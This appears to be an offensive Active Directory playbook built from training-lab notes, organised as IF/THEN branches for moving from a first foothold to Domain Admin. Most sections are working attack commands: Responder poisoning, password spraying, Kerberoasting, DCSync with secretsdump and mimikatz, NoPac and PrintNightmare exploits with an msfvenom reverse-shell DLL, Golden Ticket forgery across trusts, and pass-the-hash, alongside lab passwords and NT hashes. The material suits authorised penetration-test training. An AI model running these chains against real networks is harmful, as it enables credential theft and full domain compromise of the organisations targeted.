# 08 - Active Directory & Lateral Movement

`$TARGET` host/other IP · `$DC` DC IP/host · `$DOMAIN` FQDN · `$USER`/`$PASS`/`$HASH` current cred · `$LHOST`/`$LPORT` attacker host/port.

**Flow:** acquire 1st domain cred → validate on every protocol → enumerate (users/groups/ACLs/SPNs/trusts/policies; BloodHound early) → one branch per finding → escalate to DA → loop on every new cred.

## Resuming or starting an AD engagement
**IF** you're starting or stuck mid-AD-assessment →
- [ ] work the tips-and-tricks checklist top-to-bottom; save all output immediately.
```bash
netexec smb <ip range>
netexec ldap <ip-address> -u <username> -p <password> --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
```
WHY: an ordered checklist blocks missing anon enum, roasting, Trusts/ACLs, and post-ex hash dumping.
- [ ] works → save output, then jump to **First valid domain credential obtained**.
- [ ] fails → no creds: netexec `--rid-brute` / `--users` / `rpcclient enumdomuser` → validate usernames with `kerbrute`.
- [ ] ⏱ stuck >1h → rescan all TCP+UDP, verify tool/args, check for a second NIC and pivot (`ligolo-ng`).
→ [[11. Active Directory Enumeration & Attacks/0. Tips and Tricks|src]]

## Internal foothold, no credentials — LLMNR/NBT-NS poisoning from Linux
**IF** you have an internal foothold on the victim subnet but NO credentials →
- [ ] run Responder to poison broadcast name resolution and capture NetNTLM.
```bash
sudo responder -I ens224
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
WHY: LLMNR (5355)/NBT-NS (137) fall back when DNS fails; we spoof the name and the victim sends NetNTLM.
- [ ] works → crack offline, then treat as a cred and jump to **First valid domain credential obtained**.
- [ ] fails → Inveigh/Metasploit poisoning modules → passive `-A` discovery; WPAD `-w`/`-wf` in large orgs.
- [ ] ⏱ 30–45 min idle capture → if a user list exists, jump to **Internal password spraying from Linux**.
→ [[11. Active Directory Enumeration & Attacks/3. LLMNR or NBT-NS Poisoning  from linux|src]]

## Windows foothold, no credentials — LLMNR/NBT-NS poisoning (Inveigh)
**IF** the internal foothold is a Windows host, not Linux →
- [ ] run Inveigh (PowerShell or C#) to spoof and capture.
```bash
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
.\Inveigh.exe
```
WHY: Windows-native equivalent of Responder; the C# build has a semi-interactive console for captured data.
- [ ] works → in the C# console `GET NTLMv2UNIQUE` / `GET NTLMv2USERNAMES`; crack offline (mode 5600).
- [ ] fails → Metasploit poisoning modules → re-run from a Linux foothold on the same subnet.
- [ ] ⏱ 30–45 min idle capture → pivot to another host/subnet and keep enumerating.
→ [[11. Active Directory Enumeration & Attacks/4. LLMNR OR NBT-NS Poisoning - from Windows|src]]

## External phase — recon & username schema
**IF** you are pre-foothold on the external surface →
- [ ] hunt IP space, domains, subdomains, mail/VPN portals, username schema, breach data, leaked configs.
```bash
filetype:pdf inurl:targetdomain.com
intext:"@targetdomain.com" inurl:targetdomain.com
nslookup
```
WHY: the email/username format and password policy feed spraying; leaked creds give the initial foothold.
- [ ] works → build the username schema, then jump to **Spraying — need a valid target user list**.
- [ ] fails → bgp.he.net, Domaintools, viewdns.info, PTRArchive, IANA/ARIN/RIPE → HaveIBeenPwned, Dehashed, Trufflehog, Greyhat Warfare, linkedin2username.
- [ ] ⏱ confirm WRITTEN scope before touching anything → 3rd-party cloud (AWS/Azure) needs prior approval.
→ [[11. Active Directory Enumeration & Attacks/2. External Recon and Enumeration Principles|src]]

## Spraying — need a valid target user list
**IF** you have an internal host and no/full creds but no username list →
- [ ] gather names via SMB NULL session, LDAP anonymous, netexec, Kerbrute pre-auth, or credentialed enum.
```bash
enum4linux -U $DC | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
nxc smb $DC --users
kerbrute userenum -d $DOMAIN --dc $DC /opt/jsmith.txt
```
WHY: Kerbrute uses pre-auth — `PRINCIPAL UNKNOWN` = invalid, a pre-auth prompt = valid; avoids Event 4625.
- [ ] works → dedupe/clean the list, then jump to **Spraying — need the domain password policy first**.
- [ ] fails → SMB NULL session / LDAP anonymous bind when unauthenticated → credentialed `--users` if you have a login.
- [ ] ⏱ list still empty after anon + Kerbrute → re-check the domain FQDN and DNS, then pivot.
→ [[11. Active Directory Enumeration & Attacks/6. Password Spraying - Making a Target User List|src]]

## Spraying — need the domain password policy first
**IF** you need the lockout threshold before spraying →
- [ ] pull the policy with creds, NULL session, or LDAP anonymous bind.
```bash
crackmapexec smb $DC -u $USER -p $PASS --pass-pol
rpcclient -U "" -N $DC
querydominfo
enum4linux -P $DC
```
WHY: the lockout threshold dictates safe spray count; complexity/min length shape the wordlist.
- [ ] works → set spray count below the threshold and jump to the spraying branch for your platform.
- [ ] fails → `enum4linux-ng -P $TARGET -oA ilfreight` then `cat ilfreight.json` → LDAP `ldapsearch`/`net accounts`.
- [ ] ⏱ 15 min and still no policy → assume a low threshold (spray 1 password max) and move on.
→ [[11. Active Directory Enumeration & Attacks/5. Enumerating & Retrieving password policies|src]]

## Internal password spraying from Linux
**IF** you have a user list + the policy and want a valid credential →
- [ ] spray one password across the list, then validate hits.
```bash
kerbrute passwordspray -d $DOMAIN --dc $DC valid_users.txt Welcome1
sudo crackmapexec smb $DC -u valid_users.txt -p Password123 | grep +
```
WHY: one password, many users avoids lockout; `grep +` filters to successful logons only.
- [ ] works → for each hit run `sudo crackmapexec smb $DC -u avazquez -p Password123`, then jump to **First valid domain credential obtained**.
- [ ] fails → NT-hash spray `--local-auth` → try pattern variants (`$desktop%@admin123` → `$server%@admin123`), `ajones`→`ajones_adm`.
- [ ] ⏱ one password per lockout window → rotate the password, never exceed the threshold.
→ [[11. Active Directory Enumeration & Attacks/7. Internal Password Spraying - from Linux|src]]

## Internal password spraying from Windows
**IF** you have a domain-joined Windows foothold →
- [ ] use DomainPasswordSpray, which auto-pulls the list + policy and skips near-lockout accounts.
```bash
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
WHY: authenticated to the domain, it generates the list, queries the policy, and skips accounts one attempt from lockout.
- [ ] works → read `spray_success`, then jump to **First valid domain credential obtained**.
- [ ] fails → pass `-UserList` manually, or drop back to **Internal password spraying from Linux**.
- [ ] ⏱ if domain-joined, skip `-UserList` and let it auto-generate → one password per window.
→ [[11. Active Directory Enumeration & Attacks/8. Internal Password Spraying - from Windows|src]]

## First valid domain credential obtained — validate everywhere + enumerate
**IF** you hold your first valid domain credential →
- [ ] test it across every protocol, enumerate users/groups/logged-on users/shares, then remote-exec.
```bash
netexec smb $DC -u $USER -p $PASS
sudo crackmapexec smb $DC -u $USER -p $PASS --users
sudo crackmapexec smb $DC -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb $DC -u forend -p Klmcargo2 --shares
```
WHY: one credential unlocks the whole domain object graph; `--loggedon-users` + shares reveal where to move next.
- [ ] works → spider shares and jump to **BloodHound — collection & analysis**.
- [ ] fails → rpcclient `enumdomusers`/RID mapping → Impacket `psexec.py` (needs local admin) / `wmiexec.py` (semi-interactive, no drop) → windapsearch `--da`/`-PU`.
- [ ] ⏱ 20 min of context before re-validating a NEW credential (see the loop).
→ [[11. Active Directory Enumeration & Attacks/10. Credential Enumeration - from Linux|src]]

## Windows shell — credentialed enumeration (AD module / PowerView / Snaffler / SharpHound)
**IF** you have a Windows shell in the context of a domain account →
- [ ] enumerate AD with the RSAT module and PowerView (stealthier than dropping BloodHound).
```bash
Import-Module ActiveDirectory
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Import-Module .\PowerView.ps1
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```
WHY: the AD module + PowerView give situational awareness; Snaffler finds creds in accessible shares.
- [ ] works → collect `SharpHound` output and jump to **BloodHound — collection & analysis**.
- [ ] fails → SharpView (`.\SharpView.exe Get-DomainUser -Identity forend`) → Snaffler `-s -d $DOMAIN -o snaffler.log -v data`.
- [ ] ⏱ PowerView blocked by Defender → fall back to AD module + living-off-the-land before dropping anything.
→ [[11. Active Directory Enumeration & Attacks/11. Credential Enumeration - from Windows|src]]

## BloodHound — collection & analysis
**IF** you have a set of domain credentials and want attack-path analysis →
- [ ] collect with the right injester, then analyse paths/queries.
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns $DC -d $DOMAIN -c all
netexec ldap $TARGET -u <username> -p <password> --bloodhound --collection All --dns-server $TARGET
.\SharpHound.exe -c All --zipfilename ILFREIGHT
zip -r ilfreight_bh.zip *.json
```
WHY: BloodHound maps users/groups/computers/GPOs/ACLs/trusts/sessions/RDP/WinRM/local-admin and finds shortest paths to DA.
- [ ] works → Analysis tab (e.g. *Find Shortest Paths to Domain Admins*), Node Info, Raw Cypher → act on the first edge.
- [ ] fails → RustHound (`sudo rusthound -u 'olivia' -p 'ichiliebedich' -f 10.10.11.42 -d administrator.htb`) → `netexec ldap --bloodhound` collector.
- [ ] ⏱ neo4j default creds `neo4j`/`HTB_@cademy_stdnt!`; if no path in 20 min, re-collect after your next cred.
→ [[Bloodhound|src]]

## Living off the land (no tools to drop)
**IF** you must avoid dropping tools on a Windows host →
- [ ] use native commands for host/network/domain recon.
```bash
set
net group "Domain Admins" /domain
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
WHY: no tool drops, low noise; `dsquery * -filter` lets you query AD with raw LDAP filters/UAC bitmasks.
- [ ] works → note DCs (`8192` = SERVER_TRUST), admins, and jump to **Domain trusts — enumerate topology**.
- [ ] fails → `net1` instead of `net` to dodge the "net" string → LDAP OIDs BIT_AND `...803` / BIT_OR `...804` / IN_CHAIN `...1941`.
- [ ] ⏱ `qwinsta` shows if another operator is on the box (you may be noticed) → keep drops minimal.
→ [[11. Active Directory Enumeration & Attacks/12. Living off the Land|src]]

## Enumerating security controls (Defender / AppLocker / LAPS)
**IF** you just gained a foothold →
- [ ] check the defenses before running tools.
```bash
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode
Find-LAPSDelegatedGroups
```
WHY: it tells you which tools will run; LAPS readers/extended-rights holders reveal cleartext local-admin passwords.
- [ ] works → note `RealTimeProtectionEnabled`, AppLocker rules, `FullLanguage` vs `ConstrainedLanguage`, then choose tools.
- [ ] fails → `Get-MpComputerStatus` blocked → try AppLocker `PathConditions`/`Name` keys and `Find-AdmPwdExtendedRights`/`Get-LAPSComputers`.
- [ ] ⏱ `ConstrainedLanguage` breaks PowerView/BloodHound ingestors → switch to LOLBins / bypass.
→ [[11. Active Directory Enumeration & Attacks/9. Enumerating Security Controls|src]]

## Domain trusts — enumerate topology
**IF** you need the trust map before attacking across it →
- [ ] enumerate trusts/directions/forests.
```bash
Get-ADTrust -Filter *
Get-DomainTrustMapping
netdom query /domain:inlanefreight.local trust
```
WHY: trust type/direction determines the attack path (parent-child transitive vs external non-transitive vs forest).
- [ ] works → if a child/parent or forest trust exists, jump to the child→parent or cross-forest branch.
- [ ] fails → BloodHound pre-built query *Map Domain Trusts* → `Get-DomainTrust` / `netdom query dc|workstation`.
- [ ] ⏱ oneway/bidirectional dictates reach → confirm direction before burning time on a blocked path.
→ [[11. Active Directory Enumeration & Attacks/21. Domain Trusts|src]]

## Kerberoastable SPN found (Linux)
**IF** you hold any domain user credential and an account with an SPN exists →
- [ ] enumerate SPN accounts, request TGS tickets, crack offline.
```bash
GetUserSPNs.py -dc-ip $DC $DOMAIN/forend -request
GetUserSPNs.py -dc-ip $DC $DOMAIN/forend -request-user sqldev -outputfile sqldev_tgs
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
WHY: the TGS is encrypted with the service account's NTLM hash; any domain user can request one, then crack offline.
- [ ] works → `sudo crackmapexec smb $DC -u sqldev -p database!` then jump to **First valid domain credential obtained**.
- [ ] fails → run from a domain-joined Linux/Win via keytab, `runas /netonly` on Windows → targeted `targetedKerberoast`.
- [ ] ⏱ 30–45 min per hash → no crack, move to the next SPN, don't stall.
→ [[11. Active Directory Enumeration & Attacks/13. Kerberoasting - from Linux|src]]

## Kerberoastable SPN found (Windows)
**IF** you have a Windows shell as a domain user (or SYSTEM) →
- [ ] enumerate SPNs, request tickets, extract, crack.
```bash
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
Get-DomainUser * -spn | select samaccountname
```
WHY: Rubeus automates opsec kerberoasting (filters AES accounts, date ranges, ticket limits); `/nowrap` eases copy-down.
- [ ] works → crack, then re-validate as the service account and jump to **First valid domain credential obtained**.
- [ ] fails → manual `setspn.exe -Q */*` + Mimikatz `kerberos::list /export` → `\tgtdeleg` to force an RC4 ticket.
- [ ] ⏱ focus on user accounts (OU = Service Accounts), ignore computer accounts → one hash per time-box.
→ [[11. Active Directory Enumeration & Attacks/14. Kerberoasting - from Windows|src]]

## Account with DONT_REQ_PREAUTH (AS-REPRoast)
**IF** an account has the DONT_REQ_PREAUTH flag (no pre-auth) →
- [ ] request its AS-REP without credentials and crack it.
```bash
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol
GetNPUsers.py $DOMAIN/ -dc-ip $DC -no-pass -usersfile valid_ad_users
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
WHY: no pre-auth means the KDC hands over an AS-REP encrypted with the user's key — crackable offline, no creds needed.
- [ ] works → crack (mode 18200), then jump to **First valid domain credential obtained**.
- [ ] fails → `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` → Kerbrute userenum auto-collects AS-REP hashes.
- Ordering: spray and roast are complementary — spray lands the FIRST user, AS-REPRoast needs no creds at all; after ANY roast crack, re-spray with that context and re-run BloodHound.
- [ ] ⏱ 30 min per hash; enumerate ONE more account then move on.
→ [[11. Active Directory Enumeration & Attacks/20. Miscellaneous Misconfigurations|src]]

## ACL rights over another object (ForceChangePassword / GenericWrite / GenericAll)
**IF** BloodHound or `Find-InterestingDomainAcl` shows your object has rights over another →
- [ ] chain the rights to reach a privileged user; avoid resetting the target admin's password.
```bash
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:adunn /nowrap
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
WHY: each hop uses a legitimate AD right; a nested group inherits its parent's `GenericAll`; fake-SPN Kerberoast avoids a lockout.
- [ ] works → **ALWAYS clean up** (clear the SPN, remove the group member), then jump to **Replication rights held (DCSync)**.
- [ ] fails → Linux `targetedKerberoast` (temp SPN in one command) → `pth-toolkit` for some steps.
- [ ] ⏱ prerequisites: authenticated as each hop's user before acting → leftover artifacts alert defenders.
→ [[11. Active Directory Enumeration & Attacks/16. ACL Enumeration|src]]

## Replication rights held (DCSync)
**IF** you control a user with `DS-Replication-Get-Changes-All` (or you added it via WriteDacl) →
- [ ] confirm the rights, then replicate and dump.
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@$DC
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
WHY: abusing the Directory Replication Service Remote Protocol makes the DC hand over the password database.
- [ ] works → you hold DA-equivalent hashes → jump to **Lateral movement via PtH/PtT/PtC**.
- [ ] fails → `-just-dc-ntlm` / `-just-dc-user <USERNAME>` → grant yourself the replication right via WriteDacl, DCSync, then remove it.
- [ ] ⏱ reversible-encryption cleartext lands in `<output>.ntds.cleartext` → `cat inlanefreight_hashes.ntds.cleartext`.
→ [[11. Active Directory Enumeration & Attacks/17. DCSync|src]]

## Privileged access edges (RDP / WinRM / SQLAdmin)
**IF** you have local admin, or BloodHound shows RDP/WinRM/SQLAdmin edges →
- [ ] enumerate group members, use BloodHound queries, connect.
```bash
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
evil-winrm -i 10.129.201.234 -u forend
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
WHY: local admin → PtH over SMB; BloodHound queries quickly map RDP/WinRM/SQLAdmin access.
- [ ] works → connect, then jump to **First valid domain credential obtained** with anything you harvest.
- [ ] fails → SQL Cypher `[:SQLAdmin*1..]` edge → `mssqlclient.py $DOMAIN/DAMUNDSEN@$TARGET -windows-auth` then `enable_xp_cmdshell`.
- [ ] ⏱ SeImpersonate obtained → JuicyPotato/PrintSpoofer/RoguePotato (see `23. Windows PrivEsc`).
→ [[11. Active Directory Enumeration & Attacks/18. Privileged Access|src]]

## Misc misconfigurations (Exchange / printer bug / AD DNS / GPP / description / GPO)
**IF** you spot privileged Exchange groups, printer-bug surface, AD-integrated DNS, SYSVOL/GPP, verbose fields, or GPO write →
- [ ] hunt and abuse each in turn.
```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
adidnsdump -u inlanefreight\\forend ldap://$DC
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Disconnect Idle RDP"
```
WHY: Exchange is highly privileged by default; printer bug + unconstrained delegation → DCSync/RBCD; AD DNS hides hosts; GPP/description leak plaintext; GPO write pushes local admin.
- [ ] works → use the creds/host, then jump to **First valid domain credential obtained**.
- [ ] fails → PrivExchange relay to LDAP → DCSync; MS14-068 PAC forgery; SID History stuffing; `crackmapexec smb $DC -u forend -p Klmcargo2 -M gpp_password`.
- [ ] ⏱ GPP cpassword is publicly-decryptable; `gpp_autologin` (Registry.xml) was NEVER patched → check both fast.
→ [[11. Active Directory Enumeration & Attacks/20. Miscellaneous Misconfigurations|src]]

## Unpatched build — NoPac / PrintNightmare
**IF** an unpatched modern Windows build, a standard domain user is enough (NoPac), or the Print Spooler is reachable →
- [ ] scan then exploit; enumerate spooler; host a DLL and exploit.
```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip $DC -use-ldap
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip $DC -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
rpcdump.py @$DC | egrep 'MS-RPRN|MS-PAR'
```
WHY: NoPac chains CVE-2021-42278/42287 to impersonate a DA from a standard user; PrintNightmare runs a DLL as SYSTEM.
- [ ] works → NoPac saves tickets locally (check the output dir) → jump to **Lateral movement via PtH/PtT/PtC**.
- [ ] fails → PrintNightmare: `msfvenom -p windows/x64/meterpreter/reverse_tcp ... -f dll` + `sudo smbserver.py -smb2support CompData` → `python3 CVE-2021-1675.py`.
- [ ] ⏱ PrintNightmare needs an unpatched spooler host with MS-RPRN/MS-PAR present → else drop the vector.
→ [[11. Active Directory Enumeration & Attacks/19. Bleeding Edge Vulnerabilities|src]]

## Lateral movement — move to another host (PtH / PtT / PtC)
**IF** you hold a hash, a Kerberos ticket, or a certificate for a user/target with access → pass it; the full PtH / PtT / PtC recipes (Windows + Linux) live in [[04 - Credentials & Common Services]].
```bash
impacket-psexec administrator@$TARGET -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
- [ ] ⏱ RDP PtH needs Restricted Admin; NTLMv2 hashes CANNOT be PtH'd → don't retry; `--local-auth` sprays a local admin hash across a subnet.
→ [[04 - Credentials & Common Services]]

## Escalate to Domain Admin — child → parent trust (Windows)
**IF** you have full control of a CHILD domain in a forest and want parent DA →
- [ ] gather KRBTGT hash + child SID + target user + child FQDN + parent Enterprise Admins SID, then forge a Golden Ticket with ExtraSids.
```bash
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
Get-DomainSID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
WHY: ExtraSids injects the parent's Enterprise Admins SID (RID 519) into a forged ticket; the account then DCSync's the parent.
- [ ] works → `lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL` → you are parent DA.
- [ ] fails → alternate forge with `.\Rubeus.exe golden /rc4:... /domain:... /sid:... /sids:... /user:hacker /ptt` → confirm with `klist`.
- [ ] ⏱ prerequisites are child-DA/DCSync first; when the target differs from the user domain pass `/domain:INLANEFREIGHT.LOCAL`.
→ [[11. Active Directory Enumeration & Attacks/22. Attacking Domain Trusts - Child -> Parent Trusts - from Windows|src]]

## Escalate to Domain Admin — child → parent trust (Linux)
**IF** same child→parent attack, but you operate from Linux →
- [ ] DCSync the child KRBTGT, brute-force SIDs, forge a ticket, use it.
```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
lookupsid.py logistics.inlanefreight.local/htb-student_adm@$DC | grep -B12 "Enterprise Admins"
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
export KRB5CCNAME=hacker.ccache
```
WHY: same ExtraSids logic — forge a ticket carrying the Enterprise Admins SID and get SYSTEM on the parent DC.
- [ ] works → `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip $DC`.
- [ ] fails → `raiseChild.py -target-exec $DC LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm` automates the whole escalation.
- [ ] ⏱ Enterprise Admins SID = parent domain SID + RID 519; set `KRB5CCNAME` before psexec.
→ [[11. Active Directory Enumeration & Attacks/23. Attacking Domain Trusts - Child -> Parent Trusts - from Linux|src]]

## Cross-Forest trust abuse (Windows)
**IF** a forest trust exists and you are admin in forest A wanting forest B →
- [ ] Kerberoast across the forest, hunt foreign group membership, check password reuse.
```bash
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```
WHY: in bidirectional forest trusts, Domain A admins can be members of Domain B Domain Local groups (even built-in Administrators).
- [ ] works → `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator`.
- [ ] fails → SID History stuffing works only if SID Filtering is OFF across the trust.
- [ ] ⏱ crack the cross-forest hash offline, `/nowrap` eases copy-down → reuse same-name passwords across forests.
→ [[11. Active Directory Enumeration & Attacks/24. Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows|src]]

## Cross-Forest trust abuse (Linux)
**IF** same cross-forest attack, from Linux →
- [ ] cross-domain Kerberoast and map foreign group membership with two BloodHound collections.
```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile hash.txt
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```
WHY: `-target-domain` requests a TGS from the OTHER forest using your current creds; collecting BOTH domains shows foreign-membership edges.
- [ ] works → crack `hash.txt` offline, then jump to **First valid domain credential obtained**.
- [ ] fails → add both domains to `/etc/resolv.conf` as nameservers before each bloodhound-python run → re-collect both domains.
- [ ] ⏱ one hash per time-box; if SID Filtering is on, the SID-History path is closed.
→ [[11. Active Directory Enumeration & Attacks/25. Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux|src]]

## The loop — every new credential re-runs validation + BloodHound/ACL analysis
**IF** you obtain ANY new credential, hash, or shell (spoofing, spraying, Kerberoast, ACL abuse, secretsdump) →
- [ ] re-test it across every protocol, enumerate their shares, and re-run ACL/BloodHound analysis.
```bash
netexec smb $DC -u $USER -p $PASS
sudo crackmapexec smb $DC -u forend -p Klmcargo2 --shares
```
WHY: AD is iterative — every new principal exposes new ACLs, shares, sessions, and trust/host access; "every new user = recheck their shares".
- [ ] works → collect the new attack path and jump to the matching finding branch above.
- [ ] fails → test winrm/rdp/mssql/smb/rpc/ldap with the new creds → try NTLM/PtH and check certipy for cert-based attacks.
- [ ] ⏱ dump all hashes on a shell, collect them in a file for cracking/lateral movement → reuse with `--local-auth` for local spraying.
→ [[11. Active Directory Enumeration & Attacks/0. Tips and Tricks|src]]

## DA achieved — re-run the whole loop with DA context
**IF** you now hold Domain Admin (DCSync, NoPac, child→parent, or PtH to a DC) →
- [ ] do NOT stop at DA: re-run the entire methodology from the top, with DA context, against everything you already exposed.
- [ ] credential hunt (DA context) → [[04 - Credentials & Common Services]]: re-sweep every host's SAM / LSASS / LSA plus shares / configs / histories.
- [ ] re-enumerate hosts / shares / LDAP / web → [[02 - External Recon & Enumeration]]: DA unlocks SYSVOL / GPO, LAPS, session + host data and every share.
- [ ] re-run BloodHound with DA context → `bloodhound-python -u $USER -p $PASS -ns $DC -d $DOMAIN -c all`; a DA adds edges the first collection never had.
- [ ] check trusts / child domains → **Domain trusts** plus the child→parent / cross-forest branches above.
WHY: DA rewrites the whole object graph — rights, sessions and trust paths invisible to a low-priv principal only appear now; this is 00 Trigger 3 ("DA context → re-run 04 (cred hunt), 02 (re-enumerate), 08 (BloodHound re-run)").
- [ ] works → another DA-equivalent host set, a parent / cross-forest DA, or the sensitive-data / flag hosts.
- [ ] fails → re-collect with `netexec ldap --bloodhound` and confirm you are not blocked by `ConstrainedLanguage`.
- [ ] ⏱ 20–30 min for the DA re-run → then write the report entries.
→ [[11. Active Directory Enumeration & Attacks/0. Tips and Tricks|src]]

## Worked chain — LAB 1 (external foothold → domain compromise)
**IF** an externally-facing IIS server with a file-upload vuln + pre-placed webshell (`admin:My_W3bsH3ll_P@ssw0rd!`) →
- [ ] port-scan, get a shell, pivot (`ligolo-ng`), Kerberoast, crack, move laterally, DCSync, PtH to DC.
```bash
./Rubeus.exe kerberoast
evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7
secretsdump.py  INLANEFREIGHT/svc_sql:"lucky7"@172.16.6.50
impacket-psexec Administrator@172.16.6.3 -hashes :27dedb1dab4d8545c6e1c66fba077da0
```
WHY: full chain — webshell → pivot → kerberoast 7 SPNs → crack `svc_sql:lucky7` → local admin → secretsdump leaks `tpetty` cleartext → DCSync → PtH psexec → DC.
- [ ] works → DA. Confirms the loop: crack → validate → dump → reuse.
- [ ] fails → hosts `172.16.6.50 MS01`, `172.16.6.3 DC01`, `172.16.6.100 WEB-WIN01`; 7 kerberoastable accounts but only `svc_sql:lucky7` cracked.
- [ ] ⏱ no SSH → use `evil-winrm`; the DC DCSync needs tpetty's cleartext from the MS01 secretsdump.
→ [[11. Active Directory Enumeration & Attacks/26. LAB 1|src]]

## Worked chain — LAB 2 (internal foothold → DC via Responder + spray + shares)
**IF** an internal network with only passive/anon recon available at first →
- [ ] host discovery, user enum, Responder capture/crack, credentialed user-list + spray, share spider, config-file creds.
```bash
crackmapexec smb 172.16.7.0/23
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1
cat users.txt | awk '{ print $5 }' | cut -d '\' -f2 > valid_users.txt
```
WHY: chain — SMB null + rpcclient FAILED, Kerbrute userenum succeeded, ASREPRoast found nothing; Responder cracked one user → spray hit `BR086` → share spider found config creds → DC.
- [ ] works → DA path; reinforces the loop (Responder → spray → share contents).
- [ ] fails → hosts `172.16.7.3 DC01`, `172.16.7.50 MS01`, `172.16.7.60 SQL01`; spider JSON at `/tmp/cme_spider_plus/172.16.7.3.json`.
- [ ] ⏱ null session and rpcclient both failed here → go straight to Kerbrute userenum + Responder.
→ [[11. Active Directory Enumeration & Attacks/27. LAB 2|src]]

> NOTE: the vault's `playbook/README.md` is a default React+TypeScript+Vite template README (HMR/ESLint/React Compiler) — no AD methodology, triggers, or commands, so it was NOT mined as a topic.
